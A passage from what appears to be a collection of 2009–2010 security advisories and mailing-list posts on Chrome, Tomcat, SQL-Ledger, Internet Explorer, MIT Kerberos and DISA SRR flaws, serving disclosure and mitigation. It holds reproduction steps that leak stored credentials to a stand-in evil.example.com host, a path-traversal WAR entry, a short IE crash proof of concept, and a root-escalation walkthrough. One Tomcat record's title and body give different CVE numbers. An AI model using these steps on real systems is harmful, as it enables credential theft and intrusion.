This issue would affect Chrome users which use applications that allow users to
embed objects from third parties. Examples of such applications may include
message boards, blogs, or social networking sites.
The following steps may be used to reproduce the issue:
1. Set up an HTML page with the following contents:
<html><body>
<img src=""http://evil.example.com/image.png"" />
</body></html>
This page should not be protected by any authentication and should be hosted
at:
http://victim.example.org/test-img.html
2. Set up an HTTP digest protected area under the following URL:
http://victim.example.org/private/
3. Set up the attacker's server to be protected by HTTP authentication such that
the following URL is protected:
http://evil.example.com/image.png
4. Use Google Chrome to log in to an area protected with HTTP authentication,
such as:
http://victim.example.org/private
Save the password in the password manager.
5. Finally, access the unauthenticated HTML page on the victim's server:
http://victim.example.org/test-img.html
Since the embedded image requires authentication, a password prompt should
appear. In vulnerable versions of Google Chrome, this form will be
pre-filled with the stored credentials from the victim.example.org domain,
even though the password prompt is generated by evil.example.com.
Versions Affected
-----------------
The issue was originally discovered in version 3.0.195.38 and was also verified
to exist in version 4.0.249.78. Testing was conducted on the Windows platform.
Vendor Response
---------------
The following timeline details Google's response to the reported issue:
2010-01-20 VSR submitted a security bug report [3]. Chromium development
team began researching the issue.
2010-01-21 VSR provided additional details on the test scenario. Chromium
developers successfully reproduced the issue and committed a fix
to the source repository [4].
2010-02-10 Chrome stable version 4.0.249.89 released which includes the fix.
2010-02-15 VSR advisory released.
Recommendation
--------------
Upgrade to the latest version of Google Chrome as soon as possible.
Users are advised to be wary of HTTP authentication prompts and to carefully
inspect the domains presented in these messages to see if they match the domain
of the expected site.
Common Vulnerabilities and Exposures (CVE) Information
------------------------------------------------------
The Common Vulnerabilities and Exposures (CVE) project has assigned
the number CVE-2010-0556 to this issue. This is a candidates for
inclusion in the CVE list (http://cve.mitre.org), which standardizes
names for security problems.
Acknowledgements
----------------
Thanks to the Chromium development team for the prompt response.
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
References:
1. http://www.google.com/chrome/intl/en/features.html
2. http://googlechromereleases.blogspot.com/2010/02/stable-channel-update.html
3. http://code.google.com/p/chromium/issues/detail?id=32718
4. http://src.chromium.org/viewvc/chrome?view=rev&revision=36829
5. http://www.vsecurity.com/download/papers/WeaningTheWebOffOfSessionCookies.pdf
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Copyright 2010 Virtual Security Research, LLC. All rights reserved."
16229,More information on CVE-2009-3580,,CVE-2009-3580,"One thing not noted in the security advisory or the full disclosure
email is that there are mitigating features which can be used in
vulnerable programs (SQL-Ledger, unpatched LedgerSMB) to mitigate,
though not eliminate, the risk of XSRF.
Current versions of SQL-Ledger and LedgerSMB have a session time out
option which can be set either by the administrator or by the user.
The session timeout value provides a window during which XSRF attacks
can happen. In environments where this is a risk (for example, not
including closed networks of POS terminals), this session timeout can
be set low enough to make the attacks impractical.
Since XSRF remains a possibility in less critical areas of the
software in LedgerSMB 1.2, it is advised that administrators take
advantage of this measure as well.
I would generally recommend that SQL-Ledger users set the timeout low,
perhaps to a value between 30 and 120. The value refers to the
timeout in seconds, so this would require a new password after any
short break.
Properly configured XSRF doesn't have to be a major problem with
either of these packages. However, properly configuring it poses some
significant burdens on employees so the proper value should be
determined by each customer. The current default value (3600) which
sets the default value to one hour is way to high though. This issue
will be documented as an issue in future versions of LedgerSMB.
Best Wishes,
Chris Travers"
16247,[SECURITY] CVE-2009-2901 Apache Tomcat insecure partial deploy after failed undeploy,,CVE-2009-2901,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2009-2901: Apache Tomcat insecure partial deploy after failed undeploy
Severity: Low
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 5.5.0 to 5.5.28
Tomcat 6.0.0 to 6.0.20
The unsupported Tomcat 3.x, 4.x and 5.0.x versions may be also
affected.
Description:
By default, Tomcat automatically deploys any directories placed in a
host's appBase. This behaviour is controlled by the autoDeploy attribute
of a host which defaults to true. After a failed undeploy, the remaining
files will be deployed as a result of the autodeployment process.
Depending on circumstances, files normally protected by one or more
security constraints may be deployed without those security constraints,
making them accessible without authentication.
Mitigation:
6.0.x users should upgrade to 6.0.24 or apply this patch:
http://svn.apache.org/viewvc?rev=892815&view=rev
5.5.x users should upgrade to 5.5.29 when released or apply this patch:
http://svn.apache.org/viewvc?rev=902650&view=rev
Note: the patches also address CVE-2009-2693 and CVE-2009-2902.
Alternatively, users of all Tomcat versions may mitigate this issue by
manually ensuring that an undeploy removes all files. If one or more
files cannot be deleted, it may be necessary to stop Tomcat before the
files can be deleted.
Credit:
This issue was discovered by the Apache Tomcat security team
References:
[1] http://tomcat.apache.org/security.html
Mark Thomas
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (Darwin)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQIcBAEBAgAGBQJLXMGYAAoJEBDAHFovYFnnwXgP/RAhAkPwPP9R3S5xM/mtZj+l
cQacLI/8FdPOluVUIYNuPP2ti3v2STJyhUMOYVMQIpf7Why4fFiLaIOLZWDS04Gb
UfTQfcFIQlh69h3xQBgkEeSHNegxGLRvl8sLrhLTmaLug4qn8JW81sZnO+9PejmD
CgZKCq2ALqIvNmEU7nZTz/5xzll88O+b8P5UQqDGM9r1Z8fO8oCUood1n2hVdZAb
PoLn7CKqMtb2psGvYWqYDNeB5mRVhHnqUdtQzQy3Sy6C8YBxkmm9HWOZjoAvjMaa
X4N5THNyhXwdfNo9r6CClEiaQM6AK+jRl8SyeNiGNgNHT3Knhn9ANVUcRomRXgJm
dsKKz0wBN/zVp7ux5FLlK9O/a7VNniYMFRwg71Na9KQY6/oRlxpOU9zgWqI9Co9V
LD8g0EWliabOCv3nREDYqwrJq75ffS5TwK8mqWNlW/0gszDex34kVqnS06hMY1HT
OK5Ip1cYhUZLlcfwkmN6tBxBozCteO/Nrfh6HEahc0MXVJXbZxDXLvWtDNSrBMSY
Hqt9suXYom1rCxtFdBDtgXctAnB4UrADRxC4w/e7kZ+v3MRMtzl1UG/6cJDQtQ9f
Iwt51lECjIW6LqEpSIMTs/v5h9ueSPhY/n7GWNloSqCUgA0XL5sw5lYkGsMmS4Sh
dkab23FgmsfqGqZYUGzv
=vcr6
-----END PGP SIGNATURE-----"
16248,[SECURITY] CVE-2009-2902 Apache Tomcat unexpected file deletion in work directory,,CVE-2009-2902,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2009-2902: Apache Tomcat unexpected file deletion in work directory
Severity: Low
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 5.5.0 to 5.5.28
Tomcat 6.0.0 to 6.0.20
The unsupported Tomcat 3.x, 4.x and 5.0.x versions may be also
affected.
Description:
When deploying WAR files, the WAR file names were not checked for
directory traversal attempts. This allows an attacker to cause the
deletion of the current contents of the host's work directory which may
cause problems for currently running applications.
Mitigation:
6.0.x users should upgrade to 6.0.24 or apply this patch:
http://svn.apache.org/viewvc?rev=892815&view=rev
5.5.x users should upgrade to 5.5.29 when released or apply this patch:
http://svn.apache.org/viewvc?rev=902650&view=rev
Note: the patches also address CVE-2009-2693 and CVE-2009-2901.
Alternatively, users of all Tomcat versions may mitigate this issue by
manually validating the contents of untrusted WAR files before deployment.
Example:
Deploying and undeploying a WAR named ""...war"" causes the all files and
subdirectories in ""work/<engine name>/<host name>"" to be removed.
Credit:
This issue was discovered by the Apache Tomcat security team
References:
[1] http://tomcat.apache.org/security.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (Darwin)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQIcBAEBAgAGBQJLXMGKAAoJEBDAHFovYFnnU3sP/2qKA+k8nmXoowqeUKfgTZyg
EJAtLvuTHFViDFeA7tDrh18pMzWUfPCu/sU8qXaiY71Dw6Fa8zcJ1SksP/WB4jmN
UDuSj9vm5INxjbANnniSpZ5+tfLukPz9I3vFIIpmT4xO2aGnbqTUWPmVb2Oitapp
ePH35D0OldLIL8O4TmdTK5LPw/qufbvEtegTlryJeyO9kWvqmK54W2cs60i+txiD
zwzoRJgmNd7e/DS8+jrGrSFgLiFQlEQraQ99OvvU9bi7DofEUA1HuxPV94Ck8oMc
xbcNlAgSMuqc0PuIff68rXP3M/4M96j/BFRRLsAqUPfXBZQBZ6vc/uOVG2JriIQU
psksw1zTf8pbUTtuY6EUry3SspTHWcMGJfoxtrXa0nVxGnTg5XI/joipbCbbcF6p
0npKt3IIEH6JYtZ2DbSO0w6QjFnCVV5v0mB1LrMQDy0SzfcYf6G0MnmD6hLYNsdz
83TRgicGCfcSqZdiZDJ2Kngwnjl/oHYx2A1SVOc4q0NoIlFnzF9qMqiLM5hM87LT
3FaFsDmeFwhUxo4JRGAFA+ft1UrYufCvCQy+ZW6fxPIW2Qz9aEq63MDVojdd2yf7
Z9JApNAiO6q1cJukOaworJiv1cbcZHp0SaWDJQIo4VFT2APD2DFU79vCseIusX4e
jcy9btzWclss+2hAA/XQ
=kJa8
-----END PGP SIGNATURE-----"
16249,[SECURITY] CVE-2009-2693 Apache Tomcat unexpected file deletion and/or alteration,,CVE-2009-2693,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2009-3548: Apache Tomcat unexpected file deletion and/or alteration
Severity: Low
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 5.5.0 to 5.5.28
Tomcat 6.0.0 to 6.0.20
The unsupported Tomcat 3.x, 4.x and 5.0.x versions may be also
affected.
Description:
When deploying WAR files, the WAR files were not checked for directory
traversal attempts. This allows an attacker to create arbitrary content
outside of the web root.
Mitigation:
6.0.x users should upgrade to 6.0.24 or apply this patch:
http://svn.apache.org/viewvc?rev=892815&view=rev
5.5.x users should upgrade to 5.5.29 when released or apply this patch:
http://svn.apache.org/viewvc?rev=902650&view=rev
Note: the patches also address CVE-2009-2901 and CVE-2009-2902.
Alternatively, users of all Tomcat versions may mitigate this issue by
manually validating the contents of untrusted WAR files before deployment.
Example:
A WAR file that contains the following entry will overwrite the standard
Windows start-up script when deployed on a default Tomcat installation:
../../bin/catalina.bat
Credit:
This issue was reported to the Apache Tomcat security team by Marc
Schoenefeld of the Red Hat Security Response Team
References:
[1] http://tomcat.apache.org/security.html
Mark Thomas
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (Darwin)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQIcBAEBAgAGBQJLXMF6AAoJEBDAHFovYFnniGcP/j9ZyFlLdzcTxJLqqWyAOdUt
J1jF8vZTIqkf/vFyrRxLgw9ihaKZQ1wpd9U3vdHulcIsuAeBtiZgIhlXKItJiTLf
ImsEl5a3w3Ucp2Z71/IIRxmcffz/zIjgdzmhmnRDEhiHz/wiygpRr7X1M8ZgZVXe
itxFDhZu7ccWDTwUkxOoFuG6CWxb6/red3l5CaL4OtcWBTZ1aqQ5M1Io62pWErLI
6F/xuGTvWn4AeXaNEgJOGFZLLyX06WQJSzaJXh/tPqI153mk5Or63m03uJy9wHqa
p7ULRvRNSZ57m8L08e397uCjvu4CPGf1Rm0dDDART7UaLF1Q13gP9O6DPCS88wN+
ypgZTERSG9t0iMHZCKNjH1huRJDVPkEJwvGdtH0wGzFwg5S+oJ/J5ETW29dQ/JUR
pt1U1Xz6RnzFFgQR4Xomdc4SPysDFOIAexi8dkZPDcafN7YyiMQTRyU3iNRuoaR1
Y32qWfqJrmVDWQ1J4BLYsrLrpgZ0s5ccq6omz36lbH+3blyVPf1th84lWg9GG6lo
W3qsnJIpNfxLi9II9sDxbVpUJXLVbJmBexUDR3z9BayowNtBlwMWXEZluctGe2DO
hIkNB0D33AJvMD7wY80tnXY/hH3X5Vs+ZePEmu7TQB1KXzTinEbVdNVPF8/8woaL
7iN004jxhnUxQc8Fgwj4
=/B5h
-----END PGP SIGNATURE-----"
16255,"CVE-2009-3583, confirming problem and adding info",,CVE-2009-3583,"CVE-2009-3583 refers to a security vulnerability in SQL-Ledger (and
presumably some offshoots, including early versions of LedgerSMB)
whereby one can include arbitrary Perl code.
All versions of SQL-Ledger 2.x are presumed vulnerable. At least my
experience with SQL-Ledger suggests that the relevant code has not
changed significantly since at least 2.2.0.
All versions of LedgerSMB lower than 1.2.0 are vulnerable. 1.2.0 is
the first version that is not vulnerable.
Original full disclosure email at:
http://archives.neohapsis.com/archives/fulldisclosure/2009-12/0415.html
by another author.
I have not checked other offshoots.
I am writing because I don't think the original full disclosure email
provided sufficient information as to how this could be typically
exploited in a system with typical installations of SQL-Ledger or
offshoots. Indeed, when combined with standard functionality of the
software in typical configurations, the vulnerability is relatively
easy to exploit and does not require external upload access.
The problem here is that software allows one to create arbitrarily
named files in the css and templates directories through the template
editor. Since these files are not checked for sanity (and indeed
directory transversal has been an issue there too, but that is not
necessary to exploit this problem).
Hence if one creates a file myperlscript.css in the css directory
using the file editor that is built in with SQL-Ledger, one can then
execute the Perl code in that file using that vulnerability.
Typically, SQL-Ledger and LedgerSMB installations have these
directories writeable to the web server. In short, in typical
configurations, the application is vulnerable regardless of other
applications configured on the system.
Early versions of LedgerSMB are vulnerable (but they have many other
security problems too). However, in 1.2.0 we moved from perl scripts
that set up localization structures to the more standard gettext .po
format. For this reason country codes are no longer used to execute
arbitrary code.
If anyone is still using LedgerSMB 1.1.x, this is an excellent reason
to upgrade.....
I can confirm this problem for the versions mentioned.
Best Wishes,
Chris Travers"
16330,Code to mitigate IE event zero-day (CVE-2010-0249),,CVE-2010-0249,"Here's a mitigation for the CVE-2010-0249 IE createEventObject
srcElement zero-day. Quite simply, it just disables the
createEventObject method by mangling its name in memory. If anyone
knows an important web application that uses createEventObject,
*please* respond to the mailing list.
Use this code at your own risk. It could contain mistakes, cause
problems with other software, and fail to protect your computer.
I've done some very basic testing on the following configurations:
* Windows 2000 SP4, IE6 SP1
* Windows XP (x86) SP3, IE 6 SP3
* Windows XP (x86) SP3, IE 7
* Windows XP x64 SP1, IE 6 SP1 (32-bit and 64-bit)
* Windows XP x64 SP1, IE 7 (32-bit and 64-bit)
* Windows XP x64 SP2, IE 7 (32-bit and 64-bit)
* Windows XP x64 SP2, IE 8 (32-bit and 64-bit)
* Windows Vista (x86) SP2, IE 7
* Windows Vista (x86) SP2, IE 8
So far, I haven't been able to bypass the mitigation. I've tried 'for
(var n in document)' to discover the mangled method name (doesn't
enumerate it), I've tried 'document.x' in case the invalid surrogate
characters are ignored (doesn't work), and I've tried
'eval(""document.xud..."")' and 'eval(unescape(""document.x%ud...""))'
(IE gives an ""Invalid character"" error). So do your worst.
To test the mitigation, you can use this pared-down proof-of-concept:
[body onload=""for(var i=0; i!=10000; i++) ev.srcElement""]
[img src=. onerror=""ev=createEventObject(event); outerHTML++""]
(Of course, replace [ and ] with < and > above. The 'for' loop is
just a kludge to make it more likely to crash.)
If you're interested in researching the vulnerability (using this
PoC), breakpoint MSHTML!CImgElement::CImgElement, then run until
MSHTML!CTreeNode::CTreeNode is hit -- this tree node is freed during
MSHTML!CImgHelper::Fire_onerror, but is later accessed during
MSHTML!CEventObj::get_srcElement.
-- Derek"
16382,MITKRB5-SA-2009-004 [CVE-2009-4212] integer underflow in AES and RC4 decryption,,CVE-2009-4212,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MITKRB5-SA-2009-004
MIT krb5 Security Advisory 2009-004
Original release: 2010-01-12
Topic: integer underflow in AES and RC4 decryption
CVE-2009-4212
integer underflow in AES and RC4 decryption
CVSSv2 Vector: AV:N/AC:L/Au:N/C:C/I:C/A:C/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 10
Access Vector: Network
Access Complexity: Low
Authentication: None
Confidentiality Impact: Complete
Integrity Impact: Complete
Availability Impact: Complete
CVSSv2 Temporal Score: 7.8
Exploitability: Proof-of-Concept
Remediation Level: Official Fix
Report Confidence: Confirmed
SUMMARY
=======
Integer underflow bugs in the AES and RC4 decryption operations of the
crypto library of the MIT Kerberos software can cause crashes, heap
corruption, or, under extraordinarily unlikely conditions, arbitrary
code execution. Only releases krb5-1.3 and later are vulnerable, as
earlier releases did not contain the functionality implemented by the
vulnerable code.
This is an implementation vulnerability in MIT krb5, and is not a
vulnerability in the Kerberos protocol.
IMPACT
======
An unauthenticated remote attacker can, by inducing the decryption of
an invalid AES or RC4 ciphertext, cause a crash or heap corruption,
or, under extraordinarily unlikely conditions, arbitrary code
execution. A successful code-execution attack against a KDC can
compromise all services relying on that KDC for authentication.
However, the most probable outcome is a crash due to a memory fault or
abort() call. An attacker with a valid account in the relevant
Kerberos realm has a marginally higher chance of success to execute
arbitrary code, but the probability is still very low. Therefore, the
given Confidentiality Impact and Integrity Impact metrics of
""Complete"" represent theoretical worst-case scenarios and are both
more realistically characterized as ""Partial"".
AFFECTED SOFTWARE
=================
* KDC and application servers in MIT krb5-1.3 and later releases are
vulnerable. Earlier releases did not contain the functionality
implemented by the vulnerable code.
* Third-party applications linked with the libraries from vulnerable
releases are also vulnerable.
FIXES
=====
* The upcoming krb5-1.7.1 and krb5-1.6.4 releases will contain a fix
for this vulnerability.
* For the krb5-1.7 release, apply the patch available at:
http://web.mit.edu/kerberos/advisories/2009-004-patch_1.7.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2009-004-patch_1.7.txt.asc
* For the krb5-1.6 releases, apply the patch available at:
http://web.mit.edu/kerberos/advisories/2009-004-patch_1.6.3.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2009-004-patch_1.6.3.txt.asc
* The krb5-1.6.3 patch might apply successfully to older releases.
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2009-004.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVSSv2:
http://www.first.org/cvss/cvss-guide.html
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
CVE: CVE-2009-4212
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4212
CONTACT
=======
The MIT Kerberos Team security contact address is
<krbcore-security mit edu>. When sending sensitive information,
please PGP-encrypt it using the following key:
pub 2048R/D9058C24 2009-01-26 [expires: 2010-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
DETAILS
=======
The greatest risk is from AES decryption of invalid ciphertexts, which
can theoretically lead to arbitrary code execution under
extraordinarily unlikely conditions. Other scenarios are more likely
to lead to denial of service.
This advisory makes some reasonable assumptions about the platform.
We assume that attempts to invoke malloc() to allocate nearly SIZE_MAX
bytes will fail, which is reasonable for conventional memory
architectures. We also assume that the process has less than UINT_MAX
contiguous bytes of heap address space mapped, which is reasonable
given likely hardware and operating system configurations.
The Kerberos protocol specifications define the format of valid
ciphertexts encrypted with AES (in RFC 3962) or RC4 (in RFC 4757)
ciphers. Valid ciphertexts have a minimum length, as they include
HMAC values and random confounders. The implementation of the AES and
RC4 decryption operations does not adequately check that the provided
ciphertext meets the minimum length requirements of the ciphertext
format, and proceeds as if the minimums were already satisfied. The
decryption operations perform integer subtractions that underflow when
the minimums are not satisfied.
The integer underflows can cause the AES decryption operation to write
to memory located before the caller's output buffer. This behavior
represents the highest risk for execution of arbitrary code, but this
risk is still fairly small. On platforms where malloc(0) (a request
to allocate zero bytes) returns a null pointer, this behavior will not
occur, because this null pointer result triggers adequate error
handling.
The data written during this event is the result of the AES-CTS
decryption of the 32 bytes preceding the input buffer. The attacker
might not be able to directly influence the contents of the 32 bytes
preceding the input buffer, and might not know the encryption key that
will be used. Without knowledge of the encryption key, the attacker
has effectively no chance to predict which byte values will be
written. Due to the strong cryptographic properties of AES, for an
attacker who knows the encryption key but who does not have perfect
knowledge of the bytes to be decrypted, the probability of producing
the desired bytes is one in the number of possible uncontrolled values
of the bytes to be decrypted.
Other possible consequences of the integer underflow in the AES
decryption code include a crash due to an explicit abort() call inside
a section of code that checks (imperfectly) for invalid lengths.
The related integer underflow in the RC4 decryption code can cause an
attempt to copy nearly UINT_MAX bytes from the decryption buffer to
the output buffer, most likely causing a crash from a memory fault.
In the unlikely event that the copy does not fault (only really
possible on 64-bit platforms), there is a risk of heap corruption and
arbitrary code execution.
On 64-bit platforms, where an attempt to malloc() nearly UINT_MAX
bytes is more likely to succeed, the decryption code may attempt to
decrypt nearly UINT_MAX bytes, leading to either an ordinary
(correctly handled) error condition due to (almost certain) HMAC
validation failure or to a crash due to a memory fault (if decrypting
beyond the end of the input buffer crosses over into invalid address
space).
REVISION HISTORY
================
2010-01-12 original release
Copyright (C) 2009 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iEYEARECAAYFAktMqfAACgkQSO8fWy4vZo4cggCgoMQOq/CF68tdzP1n+BwneJG+
vrIAmwX9X8LeO6gOXW9X+2jetti2pYGG
=d7/O
-----END PGP SIGNATURE-----"
16440,UPDATE: MITKRB5-SA-2009-003 [CVE-2009-3295] KDC denial of service in cross-realm referral processing,,CVE-2009-3295,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Updated to reflect the need to authenticate for successful
exploitation. This decreases the severity level of the vulnerability.
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2009-003.txt
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iEYEARECAAYFAktCxzcACgkQSO8fWy4vZo5vdgCgkB8odnwOQixbESFIpqoF0O6t
CboAoNfB6WfXjCnMzAKRe9ZgRyyYAk7b
=87Ju
-----END PGP SIGNATURE-----"
16464,MITKRB5-SA-2009-003 [CVE-2009-3295] KDC denial of service in cross-realm referral processing,,CVE-2009-3295,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MITKRB5-SA-2009-003
MIT krb5 Security Advisory 2009-003
Original release: 2009-12-28
Last update: 2009-12-28
Topic: KDC denial of service in cross-realm referral processing
CVE-2009-3295
KDC denial of service in cross-realm referral processing
CVSSv2 Vector: AV:N/AC:L/Au:N/C:N/I:N/A:C/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 7.8
Access Vector: Network
Access Complexity: Low
Authentication: None
Confidentiality Impact: None
Integrity Impact: None
Availability Impact: Complete
CVSSv2 Temporal Score: 6.1
Exploitability: Proof-of-Concept
Remediation Level: Official Fix
Report Confidence: Confirmed
SUMMARY
=======
A null pointer dereference can occur in an error condition in the KDC
cross-realm referral processing code in MIT krb5-1.7. This can cause
the KDC to crash.
This is an implementation vulnerability in MIT krb5, and is not a
vulnerability in the Kerberos protocol.
IMPACT
======
An unauthenticated remote attacker could cause the KDC to crash due to
a null pointer dereference. Legitimate requests can also cause this
crash to occur.
AFFECTED SOFTWARE
=================
* MIT krb5 release krb5-1.7. Earlier releases did not contain the
functionality implemented by the vulnerable code.
FIXES
=====
* Upgrade: The upcoming krb5-1.7.1 release will contain a fix for this
vulnerability.
* Workaround: Disable the realm referral capability by using the
""no_host_referral = *"" setting, e.g.
[kdcdefaults]
no_host_referral = *
or
[realms]
EXAMPLE.COM = {
# ... other configuration settings ...
no_host_referral = *
}
* Apply the patch:
diff --git a/src/kdc/do_tgs_req.c b/src/kdc/do_tgs_req.c
index 298e132..12180ff 100644
- --- a/src/kdc/do_tgs_req.c
+++ b/src/kdc/do_tgs_req.c
@@ -1158,7 +1158,7 @@ prep_reprocess_req(krb5_kdc_req *request, krb5_principal *krbtgt_princ)
free(temp_buf);
if (retval) {
/* no match found */
- - kdc_err(kdc_context, retval, 0);
+ kdc_err(kdc_context, retval, ""unable to find realm of host"");
goto cleanup;
}
if (realms == 0) {
diff --git a/src/lib/kadm5/logger.c b/src/lib/kadm5/logger.c
index efff818..ef3735a 100644
- --- a/src/lib/kadm5/logger.c
+++ b/src/lib/kadm5/logger.c
@@ -188,6 +188,9 @@ klog_com_err_proc(const char *whoami, long int code, const char *format, va_list
char *cp;
char *syslogp;
+ if (whoami == NULL || format == NULL)
+ return;
+
/* Make the header */
snprintf(outbuf, sizeof(outbuf), ""%s: "", whoami);
/*
This patch is also available at
http://web.mit.edu/kerberos/advisories/2009-003-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2009-003-patch.txt.asc
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2009-003.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVSSv2:
http://www.first.org/cvss/cvss-guide.html
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
CVE: CVE-2009-3295
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3295
ACKNOWLEDGMENTS
===============
This issue was independently discovered by Jeff Blaine, Radoslav Bodo,
Jakob Haufe, and Jorgen Wahlsten.
CONTACT
=======
The MIT Kerberos Team security contact address is
<krbcore-security mit edu>. When sending sensitive information,
please PGP-encrypt it using the following key:
pub 2048R/D9058C24 2009-01-26 [expires: 2010-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
DETAILS
=======
A null pointer dereference exists in new functionality added in
krb5-1.7. This new functionality produces cross-realm referrals when
a client requests a ticket for a host-based service principal name.
Under certain error conditions, the function prep_reprocess_req() in
do_tgs_req.c calls the kdc_err() function with a null pointer as the
format string, which other code proceeds to dereference, causing a
crash on most platforms.
REVISION HISTORY
================
2009-12-28 original release
Copyright (C) 2009 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iEYEARECAAYFAks4/nkACgkQSO8fWy4vZo4UXQCg9S3XiGnhe7RQJLVOVzHXMw7P
voUAoOIuyQQOuEBbUIlPbv61cfx7XTtc
=C/Nd
-----END PGP SIGNATURE-----"
16615,UPDATE: DISA Unix SRR root compromise / CVE-2009-4211 / VU#433821,,CVE-2009-4211,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
After the issue in CVE-2009-4211 was made public, the Unix SRR script
was removed from http://iase.disa.mil/stigs/SRR/unix.html with a note
saying:
?Due to a recently identified security issue, please do not run any
version of the UNIX SRR scripts until further notice. The UNIX SRR
scripts will be corrected and posted as soon as possible. Please check
back at a later time for the updated scripts. Thanks for your
understanding and support.?
As of today, a new version dated December 7, 2009 is available for
download. Unfortunately, although some changes were made, it is still
vulnerable to the issue described in CVE-2009-4211.
The CVE should be updated to reflect that the December, 2009 version is
also vulnerable. The script should be re-evaluated to remove any
invocations of untrusted programs (especially any done as root). Users
should continue to avoid running the Unix SRR script until a fixed
version is available.
Below is a walk-through:
#######################################################################
Script started on Tue Dec 08 23:35:31 2009
### Starting with a clean directory
Don't Panic! # ls -al
total 6
drwxr-xr-x 2 root root 2 Dec 8 23:35 .
drwxrwxrwt 6 root sys 7 Dec 8 23:28 ..
### Untar the new SRR script
Don't Panic! # tar xf ../UNIX_51-15Dec2009.tar
Don't Panic! # cd Script.December
### Verify the output directory is empty
Don't Panic! # ls -al /var/tmp/fcs/outdir
total 8
drwx------ 2 root root 2 Dec 8 23:00 .
drwxr-xr-x 4 fstuart sysadmin 47 Dec 8 21:47 ..
### Verify my unprivileged, simulated malware is in place. It will
### write a root-owned file in the /var/tmp/fcs/outdir if executed
### by root.
Don't Panic! # ls -dl /var/tmp/fcs/testdir/vncserver
- -rwxr-xr-x 1 nobody nobody 174 Dec 8 23:28
/var/tmp/fcs/testdir/vncserver
### Start the SRR script
Don't Panic! # ./Start-SRR
[[ SRR output omitted ]]
### root-owned output file is created
Don't Panic! # ls -al /var/tmp/fcs/outdir/vncserver.out
- -rw------- 1 root root 370 Dec 8 23:39
/var/tmp/fcs/outdir/vncserver.out
### Contents of file show how it was invoked
Don't Panic! # cat /var/tmp/fcs/outdir/vncserver.out
/var/tmp/fcs/testdir/vncserver -help
24749 zsched
23773 ksh -o vi
3664 script /tmp/script.out
3665 script /tmp/script.out
3666 sh -i
3685 /bin/sh ./Start-SRR
27701 sh /var/tmp/SRR/Script.December/Solaris/2006-T-0013
27719 /bin/ksh /var/tmp/fcs/testdir/vncserver -help
27722 ptree 27719
script done on Tue Dec 08 23:42:11 2009
#######################################################################
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.3 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQEVAwUBSx9CiWKGA6cQSpZSAQKfrQf/TnDxgx4+4qK6XhGsoK6XMe9pTxqB+Z1v
jl8CxMLdxGihVjSJzRSEZFjx3qTOIyv6Lt58KLKp75yGGlqSESde8vSUBwoUqcl8
SM3PKPboXfETrxMeBCKwIL85DJKlZsQolgVEYtILlwUC5I2XCIGM/FoAskDEIjKZ
V0Jiv2mh5mWi/DlzF/81KURipcyPRuCYmr0qfsJjOYHZ/lbHxDCQKv7oCMij4iZv
IG3UQpO4IRMjapKdXYGAGBEaO14MfDoo928RLPBlRmlVvpPP+39gIb+SRJO/ix+o
gafMd7P9hDvG7NPWGyv6zSh4bBJvGfG5c72zknXxrg9e+rm41bsOrw==
=5/H4
-----END PGP SIGNATURE-----"
16663,CVE-2009-3586: CoreHTTP web server off-by-one buffer overflow vulnerability,,CVE-2009-3586,"census ID: census-2009-0003
URL: http://census-labs.com/news/2009/12/02/corehttp-web-server/
CVE ID: CVE-2009-3586
Affected Products: CoreHTTP web server versions <= 0.5.3.1.
Class: Improper Input Validation (CWE-20), Failure to Constrain
Operations within the Bounds of a Memory Buffer (CWE-119)
Remote: Yes
Discovered by: Patroklos Argyroudis
We have discovered a remotely exploitable ""improper input validation""
vulnerability in the CoreHTTP web server that leads to an off-by-one
